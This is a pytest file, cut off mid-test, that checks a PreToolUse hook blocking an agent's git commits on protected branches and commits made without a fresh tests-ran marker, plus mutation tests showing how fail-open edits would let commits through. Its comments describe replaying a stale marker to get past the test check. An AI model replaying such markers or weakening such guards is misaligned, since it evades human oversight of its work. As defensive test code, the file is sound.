#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.11"
# dependencies = ["pytest"]
# ///
"""Exercise the PreToolUse guard's deny/allow paths via the real stdin/stdout
hook contract (run the hook as a subprocess, feed JSON on stdin)."""

import ast
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path
from typing import NamedTuple

import pytest

HOOK = Path(__file__).resolve().parents[1] / "hooks" / "guard_pretooluse.py"

# git env vars that, if inherited from the host (e.g. a git hook context), would
# point every `git` invocation below at the live repo instead of the temp repos
# these tests create — making the fixtures depend on the runner's git state.
_GIT_ENV_VARS = (
    "GIT_DIR",
    "GIT_WORK_TREE",
    "GIT_INDEX_FILE",
    "GIT_COMMON_DIR",
    "GIT_OBJECT_DIRECTORY",
    "GIT_ALTERNATE_OBJECT_DIRECTORIES",
    "GIT_CEILING_DIRECTORIES",
)


@pytest.fixture(autouse=True)
def _hermetic_git_env(monkeypatch):
    """Scrub inherited GIT_* env so git runs against the temp repos, not the host."""
    for var in _GIT_ENV_VARS:
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setenv("GIT_CEILING_DIRECTORIES", "/")
    # Same reasoning for the test-artifacts root: a runner that happens to have
    # it exported would silently arm the staged-acceptance-test check in tests
    # that exist to prove the unset behavior.
    monkeypatch.delenv("ULTRACODE_TEST_ARTIFACTS", raising=False)


def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)


def _init_repo(repo: Path, branch: str) -> None:
    _git(repo, "init", "-q")
    _git(repo, "config", "user.email", "t@t")
    _git(repo, "config", "user.name", "t")
    _git(repo, "checkout", "-q", "-b", branch)
    (repo / "f.txt").write_text("x")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "init")


def _hook_proc(
    hook_path: Path, event: dict, cwd: Path, env_extra: dict | None = None
) -> subprocess.CompletedProcess:
    """Run ANY copy of the hook through the real stdin/stdout contract.

    Same runner the shipped hook goes through, so a patched copy under tmp_path
    is exercised exactly like the original instead of via a lookalike harness.
    Returns the raw process so callers that care about the stderr channel (as
    distinct from the stdout decision channel) can inspect both.
    """
    env = {**os.environ, **(env_extra or {})}
    return subprocess.run(
        [sys.executable, str(hook_path)],
        input=json.dumps(event),
        cwd=cwd,
        capture_output=True,
        text=True,
        env=env,
    )


def _run_mutant_hook(
    hook_path: Path, event: dict, cwd: Path, env_extra: dict | None = None
) -> tuple[int, dict | None]:
    proc = _hook_proc(hook_path, event, cwd, env_extra)
    out = None
    if proc.stdout.strip():
        out = json.loads(proc.stdout)
    return proc.returncode, out


def _run_hook(event: dict, cwd: Path, env_extra: dict | None = None) -> tuple[int, dict | None]:
    return _run_mutant_hook(HOOK, event, cwd, env_extra)


def _commit_event(cwd: Path, command: str = "git commit -m wip") -> dict:
    """A commit event. The default is the PLAIN commit form: staging is now a
    prior, separate tool call, so a chained `git add … && git commit` has staged
    nothing by the time the guard pre-evaluates this command string."""
    return {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command},
        "cwd": str(cwd),
    }


def _reason(out: dict | None) -> str:
    assert out is not None, "expected a decision on stdout"
    return out["hookSpecificOutput"]["permissionDecisionReason"]


def test_protected_branch_denies_commit(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")

    # chained form on purpose: the protected-branch clause must still see the
    # `commit` verb inside a compound command (see _git_writes' segment split).
    code, out = _run_hook(_commit_event(repo, "git add -A && git commit -m wip"), repo)

    assert code == 2  # defensive exit-code-2-blocks fallback
    assert out is not None
    decision = out["hookSpecificOutput"]
    assert decision["hookEventName"] == "PreToolUse"
    assert decision["permissionDecision"] == "deny"
    assert "Protected-branch" in decision["permissionDecisionReason"]


def test_protected_branch_denies_push(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "master")
    event = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "git push origin master"},
        "cwd": str(repo),
    }

    code, out = _run_hook(event, repo)

    assert code == 2
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def _init_unborn_repo(repo: Path, branch: str) -> None:
    """A fresh `git init` on `branch` with nothing committed: an unborn HEAD."""
    _git(repo, "init", "-q")
    _git(repo, "symbolic-ref", "HEAD", f"refs/heads/{branch}")
    (repo / "f.txt").write_text("x")
    _git(repo, "add", "-A")


def test_unborn_protected_branch_denies_commit(tmp_path: Path) -> None:
    # rev-parse cannot resolve an unborn HEAD and prints the literal `HEAD`,
    # which matched no protected name and let this commit through: the branch
    # has to come from the symbolic ref instead.
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_unborn_repo(repo, "main")

    code, out = _run_hook(_commit_event(repo), repo)

    assert code == 2
    assert "Protected-branch" in _reason(out)
    assert "'main'" in _reason(out)


def test_unborn_epic_branch_reaches_the_tests_ran_clause(tmp_path: Path) -> None:
    # The same unborn read on a non-protected branch must not invent a
    # protected-branch denial: the commit is refused by the next clause.
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_unborn_repo(repo, "ultracode/epic-42")
    impl = repo / "impl"
    impl.mkdir()
    (impl / ".current-story").write_text("STORY-1")

    code, out = _run_hook(_commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})

    assert code == 2
    assert "Protected-branch" not in _reason(out)
    assert "Tests-ran guard" in _reason(out)


def test_custom_protected_branches_env(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "release")  # not in the default protected set

    code, out = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_PROTECTED_BRANCHES": "release,trunk"}
    )

    assert code == 2
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_epic_branch_commit_denied_without_tests_marker(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "ultracode/epic-42")
    impl = repo / "impl"
    impl.mkdir()
    (impl / ".current-story").write_text("STORY-1")

    code, out = _run_hook(
        _commit_event(repo),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )

    assert code == 2  # off a protected branch, but no tests-ran marker
    reason = out["hookSpecificOutput"]["permissionDecisionReason"]
    assert "Tests-ran guard" in reason
    assert "STORY-1" in reason


# The SHA the story recorded before any implementation, and a different one
# standing in for "this marker was written against an earlier code state".
_BASELINE_SHA = "4f1c0d3a9b6e2f8d5c7a1b0e3d9f6a2c8b4e7d10"
_STALE_SHA = "9a3e5c17b028d4f6e91c73a508b2d6f4c1e97a35"


def _write_story_markers(
    impl: Path, *, marker_sha: str | None, baseline_sha: str | None
) -> None:
    """The pair the commit clauses read: the tests-ran marker and the baseline.

    `marker_sha` None writes a marker with NO `baseline=` line (the shape every
    marker had before the freshness clause existed); `baseline_sha` None writes
    no baseline file at all.
    """
    lines = ["story=STORY-1"]
    if marker_sha is not None:
        lines.append(f"baseline={marker_sha}")
    lines.append("suite=ok")
    (impl / ".tests-ran-STORY-1").write_text("\n".join(lines) + "\n")
    if baseline_sha is not None:
        (impl / ".baseline-STORY-1").write_text(baseline_sha + "\n")


def _green_story_repo(
    tmp_path: Path,
    *,
    stage: bool,
    marker_sha: str | None = _BASELINE_SHA,
    baseline_sha: str | None = _BASELINE_SHA,
) -> tuple[Path, Path]:
    """A repo on the epic branch with a tests-ran marker naming the story's
    recorded baseline, optionally with work staged by a prior separate call
    (both of which the guard now requires to commit)."""
    repo = tmp_path / "repo"
    repo.mkdir(parents=True)
    _init_repo(repo, "ultracode/epic-42")
    impl = repo / "impl"
    impl.mkdir()
    (impl / ".current-story").write_text("STORY-1")
    _write_story_markers(impl, marker_sha=marker_sha, baseline_sha=baseline_sha)
    if stage:
        (repo / "story.txt").write_text("story work")
        _git(repo, "add", "-A")
    return repo, impl


def test_epic_branch_commit_allowed_with_tests_marker(tmp_path: Path) -> None:
    # Staging happens in its own prior call, then the commit is a second call.
    repo, impl = _green_story_repo(tmp_path, stage=True)

    code, out = _run_hook(
        _commit_event(repo),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )

    assert code == 0  # green story boundary: allow, no decision JSON
    assert out is None


def test_blank_story_id_env_falls_through_to_the_marker(tmp_path: Path) -> None:
    # A whitespace-only ULTRACODE_STORY_ID is unset, as the Stop hook reads it, so
    # the guard finds STORY-1 from .current-story and lets the green commit through
    # instead of denying it for a story named "".
    repo, impl = _green_story_repo(tmp_path, stage=True)

    code, out = _run_hook(
        _commit_event(repo),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl), "ULTRACODE_STORY_ID": "   "},
    )

    assert code == 0
    assert out is None


def test_padded_story_id_env_is_trimmed(tmp_path: Path) -> None:
    # A real id with stray whitespace still names its story, not the marker's.
    repo, impl = _green_story_repo(tmp_path, stage=True)
    (impl / ".current-story").write_text("OTHER-9")

    code, out = _run_hook(
        _commit_event(repo),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl), "ULTRACODE_STORY_ID": " STORY-1 "},
    )

    assert code == 0
    assert out is None


def test_epic_branch_commit_allowed_with_nonempty_staged_index(tmp_path: Path) -> None:
    repo, impl = _green_story_repo(tmp_path, stage=True)

    code, out = _run_hook(
        _commit_event(repo),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )

    assert code == 0  # something is staged: the commit captures real work
    assert out is None


def test_empty_staged_index_denied(tmp_path: Path) -> None:
    # Clean tree: nothing was staged, so this commit would capture no work.
    repo, impl = _green_story_repo(tmp_path, stage=False)

    code, out = _run_hook(
        _commit_event(repo),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )

    assert code == 2
    assert out is not None
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_empty_index_deny_message_names_clause_and_recovery(tmp_path: Path) -> None:
    repo, impl = _green_story_repo(tmp_path, stage=False)

    _, out = _run_hook(
        _commit_event(repo),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )

    reason = out["hookSpecificOutput"]["permissionDecisionReason"]
    assert "Empty-index guard" in reason  # names the failing clause
    assert "staged index is empty" in reason
    # and all three recovery facts an agent needs to get itself unstuck
    assert "SEPARATE tool call" in reason and "git add" in reason
    assert "git commit -a" in reason
    assert "commit-time pathspecs" in reason
    assert "unsupported" in reason


def test_staged_index_probe_failure_denies_commit(tmp_path: Path) -> None:
    # The hook points at a directory that is not a git repo at all, so the
    # staged-index probe exits 128 (it does NOT raise) and cannot answer.
    nonrepo = tmp_path / "nonrepo"
    nonrepo.mkdir()
    impl = tmp_path / "impl"
    impl.mkdir()
    (impl / ".current-story").write_text("STORY-1")
    # A fresh marker, so the deny below is unambiguously the index probe.
    _write_story_markers(impl, marker_sha=_BASELINE_SHA, baseline_sha=_BASELINE_SHA)

    code, out = _run_hook(
        _commit_event(nonrepo),
        nonrepo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )

    assert code == 2  # cannot inspect the index -> fail closed
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "Empty-index guard" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_staged_index_probe_missing_git_binary_denies_commit(tmp_path: Path) -> None:
    # PATH carries no git, so the probe raises instead of returning. Work IS
    # staged here: the deny must come from the unanswerable probe, not from a
    # genuinely empty index.
    repo, impl = _green_story_repo(tmp_path, stage=True)
    empty_bin = tmp_path / "empty-bin"
    empty_bin.mkdir()

    code, out = _run_hook(
        _commit_event(repo),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl), "PATH": str(empty_bin)},
    )

    assert code == 2  # probe raised -> fail closed
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "Empty-index guard" in out["hookSpecificOutput"]["permissionDecisionReason"]


# ---------------------------------------------------------------------------
# Marker freshness: the tests-ran marker must name the story's own baseline.
#
# A bare existence check accepts a marker replayed from an earlier code state.
# The marker therefore carries a `baseline=<sha>` line and the guard requires it
# to equal the SHA the story recorded, character for character. Both values are
# read off disk; neither is recomputed from git, which is what lets a story that
# commits more than once stay valid once HEAD has moved past its baseline.
#
# Every test in this section stages real work, so a deny can never be the
# empty-index clause firing first, and asserts on the deny MESSAGE, not only on
# the exit code.
# ---------------------------------------------------------------------------


def test_marker_with_matching_baseline_allows_commit(tmp_path: Path) -> None:
    repo, impl = _green_story_repo(tmp_path, stage=True)
    # The fixture property the twins below depend on, asserted rather than assumed.
    assert f"baseline={_BASELINE_SHA}" in (impl / ".tests-ran-STORY-1").read_text()
    assert (impl / ".baseline-STORY-1").read_text().strip() == _BASELINE_SHA

    code, out = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 0, "the marker names this story's baseline: a green boundary"
    assert out is None


def test_stale_marker_baseline_denies_commit(tmp_path: Path) -> None:
    # The marker was written when the story sat at an earlier commit, then
    # replayed to satisfy a later one.
    repo, impl = _green_story_repo(tmp_path, stage=True, marker_sha=_STALE_SHA)

    code, out = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 2
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    reason = _reason(out)
    assert "Marker-freshness guard" in reason  # names the failing clause...
    assert "Empty-index guard" not in reason  # ...and not a sibling one
    assert str(impl / ".tests-ran-STORY-1") in reason  # both files it compared
    assert str(impl / ".baseline-STORY-1") in reason
    assert _STALE_SHA in reason and _BASELINE_SHA in reason  # and both values
    # the recovery: re-run to green, then rewrite the marker
    assert "Re-run the story's test/lint/build to green" in reason
    assert "rewrite" in reason and "copied verbatim" in reason


def test_marker_without_baseline_line_denies_commit(tmp_path: Path) -> None:
    # The pre-freshness marker shape. There is deliberately no inert path here:
    # a marker that cannot be tied to a baseline is the replayed marker case.
    repo, impl = _green_story_repo(tmp_path, stage=True, marker_sha=None)
    assert "baseline=" not in (impl / ".tests-ran-STORY-1").read_text()

    code, out = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 2
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    reason = _reason(out)
    assert "Marker-freshness guard" in reason
    assert "no `baseline=<sha>` line" in reason
    assert str(impl / ".baseline-STORY-1") in reason


def test_unreadable_baseline_file_denies_commit(tmp_path: Path) -> None:
    # Absent baseline first: the marker is well-formed, so the deny can only be
    # the unreadable baseline.
    repo, impl = _green_story_repo(tmp_path, stage=True, baseline_sha=None)
    assert not (impl / ".baseline-STORY-1").exists()

    code, out = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 2
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    reason = _reason(out)
    assert "Marker-freshness guard" in reason
    assert "missing or unreadable" in reason
    assert str(impl / ".tests-ran-STORY-1") in reason

    # Second unreadable shape, exercised only where file modes actually bite
    # (a root runner ignores them, and a conditional beats a silent skip).
    baseline = impl / ".baseline-STORY-1"
    baseline.write_text(_BASELINE_SHA + "\n")
    baseline.chmod(0o000)
    if not os.access(baseline, os.R_OK):
        code, out = _run_hook(
            _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
        )
        assert code == 2
        assert "missing or unreadable" in _reason(out)
    baseline.chmod(0o644)

    # Control: made readable again, the same fixture is allowed. Without it the
    # pair would pass even if the clause denied unconditionally.
    code, out = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 0
    assert out is None


def test_marker_baseline_survives_head_move_on_multi_commit_story(
    tmp_path: Path,
) -> None:
    """A story that commits twice keeps the SHA it started from.

    The comparison SHA is READ from the baseline file, never recomputed, so the
    story's second commit is judged against where it started rather than
    against the HEAD its own first commit created.
    """
    repo, impl = _green_story_repo(tmp_path, stage=True)
    head_before = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()

    # The story's first commit lands, so HEAD walks off the recorded baseline.
    _git(repo, "commit", "-q", "-m", "story work, part one")
    head_after = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()
    assert head_after != head_before, "HEAD must actually have moved"
    assert head_after != _BASELINE_SHA

    # More work, staged in its own prior call. The marker is NOT rewritten.
    (repo / "story2.txt").write_text("story work, part two")
    _git(repo, "add", "story2.txt")

    code, out = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 0, "the second commit of a multi-commit story stays allowed"
    assert out is None


def test_stale_marker_denies_with_no_atdd_checklist_present(tmp_path: Path) -> None:
    """The freshness clause is not scoped to the production profile.

    The guard reads no profile, so "no atdd-checklist on disk" IS the lighter
    profile as the guard can observe it. A stale marker must still deny there,
    which is what keeps this module's own runs inside the net.
    """
    repo, impl = _green_story_repo(tmp_path, stage=True, marker_sha=_STALE_SHA)
    tests_root = repo / "test-artifacts"
    tests_root.mkdir()
    assert not (tests_root / "atdd-checklist-STORY-1.md").exists()
    assert not any(impl.glob("atdd-checklist-*"))

    code, out = _run_hook(
        _commit_event(repo),
        repo,
        {
            "ULTRACODE_IMPL_ARTIFACTS": str(impl),
            "ULTRACODE_TEST_ARTIFACTS": str(tests_root),
        },
    )

    assert code == 2
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "Marker-freshness guard" in _reason(out)


# ---------------------------------------------------------------------------
# Executed mutants of the guard itself.
#
# Each writes a patched COPY of the hook under tmp_path (never the shipped
# file, which is live) and runs it through the same stdin/stdout contract. Each
# mutation must red exactly the assertion(s) it belongs to and leave the others
# green — that isolation is what makes the corresponding check load-bearing
# rather than a shared alarm.
# ---------------------------------------------------------------------------

_PROBE_EXCEPT_BRANCH = (
    "    except (OSError, subprocess.SubprocessError):\n"
    "        return False  # git missing, timeout, ...: cannot answer -> fail closed"
)
_PROBE_EXIT_CODE_BRANCHES = (
    "    if out.returncode == 0:\n"
    "        return False  # nothing staged\n"
    "    if out.returncode == 1:\n"
    "        return True  # something staged\n"
    "    return False  # any other exit code is a probe failure -> fail closed"
)
_EMPTY_INDEX_CALL_SITE = "        if not _staged_index_nonempty(cwd):\n"


def _hook_source() -> str:
    return HOOK.read_text(encoding="utf-8")


def _write_mutant(tmp_path: Path, name: str, old: str, new: str) -> Path:
    """Copy the shipped hook, apply one textual mutation, return the copy."""
    src = _hook_source()
    assert old in src, f"mutation anchor drifted out of the hook: {name}"
    path = tmp_path / f"mutant_{name}.py"
    path.write_text(src.replace(old, new, 1), encoding="utf-8")
    return path


def _empty_index_clause(src: str) -> str:
    """The empty-index clause plus its call site, exactly as it sits in main()."""
    start = src.index(_EMPTY_INDEX_CALL_SITE)
    end = src.index("\n    _allow()", start)
    return src[start:end + 1]


def test_mutant_without_empty_index_clause_allows_empty_commit(tmp_path: Path) -> None:
    """Twin: with the clause deleted, the empty-index commit is ALLOWED.

    The ALLOW is the point — if the deny survived the clause's removal, the
    clause would not be what produces it and the deny test would prove nothing.
    """
    clause = _empty_index_clause(_hook_source())
    mutant = _write_mutant(tmp_path, "no_clause", clause, "")
    repo, impl = _green_story_repo(tmp_path, stage=False)

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 0
    assert out is None


def test_mutant_unconditional_deny_reds_nonempty_index_commit(tmp_path: Path) -> None:
    """Twin: deny every commit that reaches the clause, whatever is staged.

    Only the allow-path assertion reds; every deny assertion still passes,
    which is exactly why the allow path is load-bearing and not a restatement
    of the deny. (Inverting the exit-code test instead would ALLOW the empty
    index and red the deny too, isolating nothing.)
    """
    mutant = _write_mutant(
        tmp_path, "always_deny", _EMPTY_INDEX_CALL_SITE, "        if True:\n"
    )
    staged_repo, staged_impl = _green_story_repo(tmp_path / "a", stage=True)
    code, _ = _run_mutant_hook(
        mutant, _commit_event(staged_repo), staged_repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(staged_impl)},
    )
    assert code == 2, "the allow-path assertion must red under an unconditional deny"

    clean_repo, clean_impl = _green_story_repo(tmp_path / "b", stage=False)
    code, _ = _run_mutant_hook(
        mutant, _commit_event(clean_repo), clean_repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(clean_impl)},
    )
    assert code == 2, "the empty-index deny assertion stays green"

    nonrepo = tmp_path / "nonrepo"
    nonrepo.mkdir()
    code, _ = _run_mutant_hook(
        mutant, _commit_event(nonrepo), nonrepo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(clean_impl)},
    )
    assert code == 2, "the exit-128 probe-failure assertion stays green"

    empty_bin = tmp_path / "empty-bin"
    empty_bin.mkdir()
    code, _ = _run_mutant_hook(
        mutant, _commit_event(staged_repo), staged_repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(staged_impl), "PATH": str(empty_bin)},
    )
    assert code == 2, "the raising-probe assertion stays green"


def test_mutant_probe_exception_fails_open_allows_commit(tmp_path: Path) -> None:
    """Twin (exception half): the except branch reports "something is staged",
    the fail-OPEN shape _current_branch uses. Only the raising-probe assertion
    reds; the exit-128 one does not, because a non-repo cwd returns 128 without
    ever entering the except branch."""
    mutant = _write_mutant(
        tmp_path,
        "except_open",
        _PROBE_EXCEPT_BRANCH,
        "    except (OSError, subprocess.SubprocessError):\n        return True",
    )
    repo, impl = _green_story_repo(tmp_path, stage=True)
    empty_bin = tmp_path / "empty-bin"
    empty_bin.mkdir()

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl), "PATH": str(empty_bin)},
    )
    assert code == 0, "the raising-probe assertion must red under a fail-open except"
    assert out is None

    # ... while the exit-128 path never reaches the except branch and still denies.
    nonrepo = tmp_path / "nonrepo"
    nonrepo.mkdir()
    code, _ = _run_mutant_hook(
        mutant, _commit_event(nonrepo), nonrepo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 2, "the exit-128 assertion stays green: no exception is raised there"

    # and the plain allow/deny pair is untouched
    clean_repo, clean_impl = _green_story_repo(tmp_path / "b", stage=False)
    code, _ = _run_mutant_hook(
        mutant, _commit_event(clean_repo), clean_repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(clean_impl)},
    )
    assert code == 2, "the empty-index deny assertion stays green"
    code, _ = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 0, "the allow-path assertion stays green"


def test_mutant_probe_unknown_exit_code_fails_open_allows_commit(tmp_path: Path) -> None:
    """Twin (exit-code half): read "anything not 0" as staged, so 128 becomes a
    legitimate allow. Only the exit-128 assertion reds — the raising-probe one
    stays green (the except branch is untouched), as do the plain allow (exit 1)
    and deny (exit 0) paths. That is what makes this an independent proof of the
    exit-code obligation rather than a second copy of the exception twin."""
    mutant = _write_mutant(
        tmp_path,
        "exitcode_open",
        _PROBE_EXIT_CODE_BRANCHES,
        "    return out.returncode != 0",
    )
    repo, impl = _green_story_repo(tmp_path, stage=True)
    nonrepo = tmp_path / "nonrepo"
    nonrepo.mkdir()

    code, out = _run_mutant_hook(
        mutant, _commit_event(nonrepo), nonrepo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 0, "the exit-128 assertion must red when 128 is read as staged"
    assert out is None

    empty_bin = tmp_path / "empty-bin"
    empty_bin.mkdir()
    code, _ = _run_mutant_hook(
        mutant, _commit_event(repo), repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl), "PATH": str(empty_bin)},
    )
    assert code == 2, "the raising-probe assertion stays green: the except branch is untouched"

    clean_repo, clean_impl = _green_story_repo(tmp_path / "b", stage=False)
    code, _ = _run_mutant_hook(
        mutant, _commit_event(clean_repo), clean_repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(clean_impl)},
    )
    assert code == 2, "the empty-index deny assertion stays green (exit 0)"
    code, _ = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 0, "the allow-path assertion stays green (exit 1)"


# --- Executed mutants of the marker-freshness clause ------------------------
# One mutation per obligation, each on a COPY of the hook under tmp_path. The
# shipped hook is the LIVE PreToolUse guard for this repo, so no test may touch
# it.

_FRESHNESS_EQUALITY = "    if marker_sha != baseline_sha:\n"
_FRESHNESS_NO_MARKER_LINE = "    if marker_sha is None:\n        _deny(\n"
_FRESHNESS_NO_BASELINE = "    if baseline_sha is None:\n        _deny(\n"
_FRESHNESS_CALL_SITE = "        _marker_freshness_gate(marker, baseline)"
_BASELINE_READ_BODY = (
    "    try:\n"
    '        return baseline.read_text(encoding="utf-8").strip() or None\n'
    "    except (OSError, UnicodeDecodeError):\n"
    "        return None"
)


def test_twin_neutered_equality_check_allows_stale_marker(tmp_path: Path) -> None:
    """Twin: with the equality branch neutered, the replayed marker is ALLOWED.

    Control + mutant in ONE function on purpose. Without the control half, a
    mutation that silently matched nothing would leave the copy behaving like
    the original and this test would still pass on a no-op edit; with it, a
    no-op mutation reds here.
    """
    control = tmp_path / "control_guard.py"
    control.write_text(_hook_source(), encoding="utf-8")
    repo_c, impl_c = _green_story_repo(tmp_path / "c", stage=True, marker_sha=_STALE_SHA)
    code, out = _run_mutant_hook(
        control, _commit_event(repo_c), repo_c, {"ULTRACODE_IMPL_ARTIFACTS": str(impl_c)}
    )
    assert code == 2, "the UNMUTATED copy must still deny the replayed marker"
    assert "Marker-freshness guard" in _reason(out)

    mutant = _write_mutant(
        tmp_path,
        "no_equality",
        _FRESHNESS_EQUALITY,
        "    if False:  # mutant: equality check removed\n",
    )
    repo_m, impl_m = _green_story_repo(tmp_path / "m", stage=True, marker_sha=_STALE_SHA)
    code, out = _run_mutant_hook(
        mutant, _commit_event(repo_m), repo_m, {"ULTRACODE_IMPL_ARTIFACTS": str(impl_m)}
    )
    assert code == 0, "the stale-marker deny assertion must red without the equality"
    assert out is None


def test_mutant_inverted_freshness_equality_denies_matching_pair(
    tmp_path: Path,
) -> None:
    """Twin for the ALLOW direction: invert the comparison.

    The matching pair then denies, so the allow assertion reds — which is what
    proves it asserts the clause's allow branch rather than merely observing
    that the clause never fires.
    """
    mutant = _write_mutant(
        tmp_path, "inverted_equality", _FRESHNESS_EQUALITY, "    if marker_sha == baseline_sha:\n"
    )
    repo, impl = _green_story_repo(tmp_path, stage=True)

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 2, "the matching-pair allow assertion must red when inverted"
    assert "Marker-freshness guard" in _reason(out)


def test_mutant_freshness_absence_falls_open_allows_both_gaps(tmp_path: Path) -> None:
    """Twin: replace both fail-closed branches with a fall-through to allow.

    This is exactly the edit that would turn the deliberate no-escape-hatch
    posture into the inert one the sibling un-skip clause uses for its unset
    env var, so both absence assertions must red under it.
    """
    mutant = _write_mutant_multi(
        tmp_path,
        "freshness_fail_open",
        [
            (_FRESHNESS_NO_MARKER_LINE,
             "    if marker_sha is None:\n        _allow()\n        _deny(\n"),
            (_FRESHNESS_NO_BASELINE,
             "    if baseline_sha is None:\n        _allow()\n        _deny(\n"),
        ],
    )

    no_line_repo, no_line_impl = _green_story_repo(
        tmp_path / "a", stage=True, marker_sha=None
    )
    code, out = _run_mutant_hook(
        mutant, _commit_event(no_line_repo), no_line_repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(no_line_impl)},
    )
    assert code == 0, "the missing-`baseline=`-line deny assertion must red"
    assert out is None

    no_file_repo, no_file_impl = _green_story_repo(
        tmp_path / "b", stage=True, baseline_sha=None
    )
    code, out = _run_mutant_hook(
        mutant, _commit_event(no_file_repo), no_file_repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(no_file_impl)},
    )
    assert code == 0, "the unreadable-baseline deny assertion must red"
    assert out is None

    # ...while the mismatch deny is untouched: the mutation removes the two
    # absence branches, not the clause.
    stale_repo, stale_impl = _green_story_repo(
        tmp_path / "c", stage=True, marker_sha=_STALE_SHA
    )
    code, _ = _run_mutant_hook(
        mutant, _commit_event(stale_repo), stale_repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(stale_impl)},
    )
    assert code == 2, "the stale-marker deny assertion stays green"


def test_mutant_recomputing_baseline_from_git_denies_after_head_move(
    tmp_path: Path,
) -> None:
    """Twin: source the comparison SHA from `git rev-parse HEAD` instead of
    reading the recorded baseline. Once HEAD has moved the recomputed value no
    longer equals the marker's line, and the multi-commit assertion reds."""
    mutant = _write_mutant(
        tmp_path,
        "recomputed_baseline",
        _BASELINE_READ_BODY,
        "    out = subprocess.run(\n"
        '        ["git", "rev-parse", "HEAD"], capture_output=True, text=True\n'
        "    )\n"
        "    return out.stdout.strip() or None",
    )
    repo, impl = _green_story_repo(tmp_path, stage=True)
    # Pin the marker to the pre-move HEAD so the unmutated clause would allow.
    head = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()
    _write_story_markers(impl, marker_sha=head, baseline_sha=head)

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 0, "before HEAD moves, a recomputed SHA happens to agree"
    assert out is None

    _git(repo, "commit", "-q", "-m", "story work, part one")
    (repo / "story2.txt").write_text("story work, part two")
    _git(repo, "add", "story2.txt")

    code, out = _run_mutant_hook(
